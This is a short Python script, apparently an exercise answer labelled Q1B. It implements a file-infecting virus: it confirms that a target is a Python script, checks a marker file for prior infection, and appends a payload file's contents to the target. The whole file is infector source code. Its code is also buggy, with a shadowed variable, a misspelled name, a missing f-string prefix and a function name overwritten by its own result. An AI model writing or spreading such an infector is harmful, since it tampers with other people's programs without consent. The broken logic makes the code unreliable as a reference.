import sys

def is_infected(file):
    out_path = "/Q1B.out"
    try:
        with open(out_path, "r") as file:
            for row in file:
                if row == f"{file}\n":
                    return True     
        return False
    except:
        return False
    
def is_script(file):
    required_statement = 'if __name__ == "__main__":'
    with open(file, "r") as file:
        for row in file:
            if row.strip() == required_statement:
                return True
    return False

def verify(target_file):
    is_python_script = False

    if not is_script(target_file):
        print("Could not verify file is python script; no {required_statement} statement.")
        return 0
    if is_infected(target_file):
        print("File is already infected.")
        return 0

    return 1

def inject(target_file, payload_file):
    try: 
        with open(target_file, "a") as target_file, open(payload_file, "r") as payload_file:
            target_file.write(payload_file.read())
            return 0
    except:
        print(f"An error occured injecting {paylaod_file}.")
        return 1





def main():
    if len(sys.argv) != 2:
        print("Usage: python3 Q1B.py [target_file]\n")
        return 1
    
    target_file = sys.argv[1]

    is_verified = verify(target_file)
    if not is_verified:
        print("Verification failed\nQuitting...")
        return 1


    payload_file = "/Q1B_payload.py"
    inject = inject(target_file, payload_file)
    if inject == 1: return 1

    return 0
    
main()